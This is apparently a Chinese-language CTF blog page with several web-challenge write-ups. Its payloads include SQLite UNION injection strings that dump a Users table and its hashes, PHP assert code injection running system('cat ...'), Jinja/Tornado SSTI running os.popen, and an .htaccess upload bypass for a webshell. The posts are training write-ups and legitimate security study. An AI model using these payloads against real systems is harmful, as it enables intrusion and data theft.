<p><img src="/images/xctf-FlatScience/image-20210304170216778.png" alt="image-20210304170216778"></p>
<blockquote>
<p>我看不懂，但我……</p>
</blockquote>
<p>在一通乱试下，原来是在login.php?debug……大概是个所谓的调试界面吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1($pass.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.$row[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>sqlite的注入：</p>
<p>使usr=admin’ or ‘1’=1发现页面跳转，cookie中有值为+admin的记录，本来想直接盲注，但发现sqlite似乎没有if function……学习一下sqlite的注入</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">dalao</a></p>
<blockquote>
<p><strong>sqlite_master隐藏表：</strong></p>
<p>字段：type/name/tbl_name/rootpage/sql</p>
<p>type列记录了项目的类型，如table、index、view、trigger。</p>
<p>name列记录了项目的名称，如表名、索引名等。</p>
<p>tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
<p>rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。</p>
<p>sql列记录创建该项目的SQL语句。</p>
<p>**sqlite_version()**：版本号</p>
</blockquote>
<p>用order by 判断表有两列，换掉admin并union select 1，2可以看到cookie值变为+2，那就不用盲注了。sqlite没有concat但有group_concat……害</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查表名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select tbl_name from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查列名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select sql from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查数据：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select group_concat(hint) from Users)--</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sql：</span><br><span class="line">CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</span><br><span class="line"></span><br><span class="line">id： 	  1,2,3</span><br><span class="line"></span><br><span class="line">name： 	  admin,fritze,hansi</span><br><span class="line"></span><br><span class="line">password： 3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">	       ,</span><br><span class="line">	       54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">	       ,</span><br><span class="line">	       34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line"></span><br><span class="line">hint：	  my fav word in my fav paper?!,my love is…?,the password is password</span><br></pre></td></tr></table></figure>

<p>还在打谜语……大概是paper里有一个词是密码吧……查一波，发现这还涉及到pdf转txt……</p>
<p>奈何太菜，脚本也看不懂，贴大佬链接吧：</p>
<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-705026.html">dalao2</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/harry_c/article/details/101773526">dalao3</a></p>
<p>密码是：ThinJerboa</p>
<blockquote>
<p>wohaocai，6LCc6K+t5Lq65rua5Ye65ZOl6LCt5biC==</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/04/xctf-csaw-2016-quals-mfw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/04/xctf-csaw-2016-quals-mfw/" class="post-title-link" itemprop="url">xctf-csaw-2016-quals-mfw</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-04 12:29:38 / 修改时间：14:19:42" itemprop="dateCreated datePublished" datetime="2021-03-04T12:29:38+08:00">2021-03-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="xctf-csaw-2016-quals-mfw"><a href="#xctf-csaw-2016-quals-mfw" class="headerlink" title="xctf-csaw-2016-quals-mfw"></a>xctf-csaw-2016-quals-mfw</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>打开是一个网页，点击about：</p>
<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123209659.png" alt="image-20210304123209659"></p>
<p>题目提示使用了git，推测存在.git源码泄露：</p>
<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123314880.png" alt="image-20210304123314880">        </p>
<p>访问发现网站目录，用GitHack获取源码：</p>
<blockquote>
<p>GitHack在python2下运行，使用方法：python2 GitHack.py [指定url]</p>
</blockquote>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123716586.png" alt="image-20210304123716586" style="zoom:90%;" />

<p>index.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>涉及到了assert的知识点：</p>
<blockquote>
<p>assert — 检查一个断言是否为 FALSE</p>
<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<p>如本题：assert(“strpos(‘$file’, ‘..’) === false”) 执行了strpos函数对file进行了检查，若没有检查到..，则继续运行；若检查到，则抛出warning并die(“Detected hacking attempt!”)。</p>
</blockquote>
<p>重点是对于assert函数的利用，控制file使之执行指定的代码。</p>
<p>eg：?page=’) or eval(“echo 9*9;”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304134649985.png" alt="image-20210304134649985" style="zoom:80%;" />

<p>不是很懂为什么会输出Detected hacking attempt!，本地尝试：</p>
<p>?page=’) or eval(“print(8*9);”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304141243600.png" alt="image-20210304141243600" style="zoom:80%;" />

<p>抑制住了疯狂报错……输出了bool（false），大概是语法或是什么地方出了一点问题……就挺迷的……</p>
<p>?page=’) or system(“cat templates/flag.php”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304135359125.png" alt="image-20210304135359125" style="zoom:80%;" />

<p>得到flag</p>
<p>关于or可用点号替换的推测：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/alsf/p/9618070.html">深入解析PHP中逗号与点号的区别</a></p>
<blockquote>
<p>……</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" class="post-title-link" itemprop="url">网鼎杯-2020-青龙组-AreUSerialz</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-02-26 11:21:24 / 修改时间：15:20:54" itemprop="dateCreated datePublished" datetime="2021-02-26T11:21:24+08:00">2021-02-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="网鼎杯-2020-青龙组-AreUSerialz"></a>网鼎杯-2020-青龙组-AreUSerialz</h4>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/Buu%E4%BA%94%E9%81%93%E9%A2%98%EF%BC%9AExec%E3%80%81Knife%E3%80%81easy_tornado%E3%80%81fake%20google%E3%80%81%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/24/Buu%E4%BA%94%E9%81%93%E9%A2%98%EF%BC%9AExec%E3%80%81Knife%E3%80%81easy_tornado%E3%80%81fake%20google%E3%80%81%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/" class="post-title-link" itemprop="url">buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-02-24 11:30:06" itemprop="dateCreated datePublished" datetime="2021-02-24T11:30:06+08:00">2021-02-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-01 14:55:19" itemprop="dateModified" datetime="2021-03-01T14:55:19+08:00">2021-03-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <a id="more"></a>

<h4 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
<p>这个好像当时没有写wp，补一下</p>
</blockquote>
<p>今年的ACTF有个题倒是和这个差不多，感觉这个简单一些吧……远程的命令执行</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115130403.png" alt="image-20210224115130403"></p>
<p>发现根目录有flag，cat：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115214111.png" alt="image-20210224115214111"></p>
<h4 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h4><h6 id="1-题目：-1"><a href="#1-题目：-1" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-1"><a href="#2-过程：-1" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115601387.png" alt="image-20210224115601387"></p>
<p>网站给自己下了个马……直接用蚁剑连：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115730605.png" alt="image-20210224115730605"></p>
<h4 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h4><h6 id="1-题目：-2"><a href="#1-题目：-2" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-2"><a href="#2-过程：-2" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141404866.png" alt="image-20210224141404866"></p>
<blockquote>
<p>flag in /fllllllllllllag</p>
<p>Tornado是一种 Web 服务器软件的开源版本。</p>
<p>Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</p>
</blockquote>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141715722.png" alt="image-20210224141715722"></p>
<p>提示：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141740750.png" alt="image-20210224141740750"></p>
<p>应该就是后面的验证……改掉之后是error界面</p>
<p>?msg=1 则页面显示是1，页面有严格的过滤……</p>
<p>在Tornado模板中：</p>
<blockquote>
<p>二、两种表现形式</p>
<p>（一）模板变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; variable_name &#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">欢迎&#123;&#123; username &#125;&#125;登录</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>它也可以是python表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 1 + 1 &#125;&#125;</span><br><span class="line">&#123;&#123; time.time() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（二）模板命令</p>
<p>其实就是，大括号百分号所包裹的python语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if 1 %&#125;</span><br><span class="line"> this is if</span><br><span class="line">&#123;% end %&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>搜索cookie_secret，发现结果与tornado有关，官网的搜索结果：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224154446715.png" alt="image-20210224154446715"></p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224163500572.png" alt="image-20210224163500572"></p>
<p>这是RequestHandler中包含application的意思吗……</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>中的解释：</p>
<blockquote>
<p>handler 指向RequestHandler</p>
<p>而RequestHandler.settings又指向self.application.settings</p>
<p>所以handler.settings就指向RequestHandler.application.settings了</p>
</blockquote>
<p>通过handler.settings获得环境变量？</p>
<p>使用案例：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224165102865.png" alt="image-20210224165102865"></p>
<p>（self类似于this）</p>
<p>细节上还不是很懂……大概是可以指向RequestHandler，获取内部的变量吧。</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224165551945.png" alt="image-20210224165551945"></p>
<p>获取到cookie_secret，加密：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224170137490.png" alt="image-20210224170137490"></p>
<p>访问获取flag：</p>
<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224170208821.png" alt="image-20210224170208821"></p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h6 id="1-题目：-3"><a href="#1-题目：-3" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-3"><a href="#2-过程：-3" class="headerlink" title="2.过程："></a>2.过程：</h6><p>直接上来让上传木马……过滤了后缀名</p>
<p>之前的一道题是.user.ini的利用，要求在上传到.user.ini的文件夹下，也要有可执行的正常php文件。</p>
<p>这个并没有……应该是提到的.htaccess文件</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cmzhuang/article/details/53537591">.htaccess详解及.htaccess参数说明</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.cn/div-tutorial-416140.html">.htaccess是什么文件？有什么用途？</a></p>
<p>这里可以用<code>AddType application/x-httpd-php .jpg</code>，指定将jpg文件解析为php文件。    </p>
<p>上传之后用antsword连接……</p>
<p>![image-20210228184753486](/images/Buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢/image-20210228184753486.png)</p>
<p>在根目录找到flag。</p>
<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><h6 id="1-题目：-4"><a href="#1-题目：-4" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-4"><a href="#2-过程：-4" class="headerlink" title="2.过程："></a>2.过程：</h6><p>搜索一下：</p>
<p>![image-20210226233025995](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233025995.png)</p>
<p>此时页面的源码为：</p>
<p>![image-20210226233149495](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233149495.png)</p>
<p>ssti……用一下forgetful的解就过了，记一下吧……：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（这篇好水……）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/ASIS-2019-Unicorn-shop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/24/ASIS-2019-Unicorn-shop/" class="post-title-link" itemprop="url">ASIS-2019-Unicorn-shop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-02-24 11:00:43 / 修改时间：11:21:08" itemprop="dateCreated datePublished" datetime="2021-02-24T11:00:43+08:00">2021-02-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>题目要我们购买独角兽，实际上只有第四种可以购买……</p>
<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224110437694.png" alt="image-20210224110437694"></p>
<p>只可以输入一个字符，如果不填入内容提交，网页会发生报错：</p>
<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224110612819.png" alt="image-20210224110612819"></p>
<blockquote>
<p>numeric：</p>
<p><strong>语法</strong>：unicodedata.numeric(chr[, default])</p>
<p><strong>描述</strong>：将Unicode字符(chr)转换为等效的数值。以浮点形式返回【与chr相对应的数值】。若未定义这样的值，则返回默认值default；若未指定默认值，则抛出ValueError异常。（把一个表示数字的字符转换为浮点数。比如，可将’5’、’五’转换数值输出。与digit()不同是numeric()可以转换任意表示数值的字符，不仅仅限于0到9的字符）</p>
</blockquote>
<p>不同的Unicode字符可以对应不同的数值，可以在<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode%E6%9F%A5%E8%AF%A2%EF%BC%9A">https://www.compart.com/en/unicode查询：</a></p>
<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224111552294.png" alt="image-20210224111552294"></p>
<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224111622099.png" alt="image-20210224111622099"></p>
<p>官方wp：<a target="_blank" rel="noopener" href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>
<p>dalao：<a target="_blank" rel="noopener" href="https://gality.cn/?p=123#%E7%AD%89%E4%BB%B7%E5%BD%A2%E5%BC%8F">https://gality.cn/?p=123#%E7%AD%89%E4%BB%B7%E5%BD%A2%E5%BC%8F</a></p>
<p>……</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="inanb"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">inanb</p>
  <div class="site-description" itemprop="description">铁马冰河入梦来</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">55</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">inanb</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


